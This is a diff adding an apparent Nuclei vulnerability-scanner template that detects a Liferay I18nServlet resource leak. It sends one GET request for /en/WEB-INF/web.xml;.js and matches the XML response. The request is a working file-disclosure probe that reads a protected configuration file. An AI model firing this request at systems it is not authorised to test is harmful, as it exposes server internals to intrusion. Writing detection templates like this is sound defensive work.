@@ -1,0 +1,38 @@
+id: liferay-resource-leak
+
+info:
+  name: Liferay - Resource leakage through I18nServlet
+  author: DhiyaneshDk
+  severity: high
+  description: |
+    I18n Servlet leaks information by sending an HTTP request to /[language]/[resource];.js (also .jsp works).
+  remediation: Update Liferay to the latest version
+  reference:
+    - https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LiferayI18nServletResourceLeaks.java
+  metadata:
+    verified: true
+    shodan-query: title:"Liferay"
+  tags: liferay,lfi,j2ee
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/en/WEB-INF/web.xml;.js"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<web-app id="
+          - "<?xml"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "application/xml"
+
+      - type: status
+        status:
+          - 200
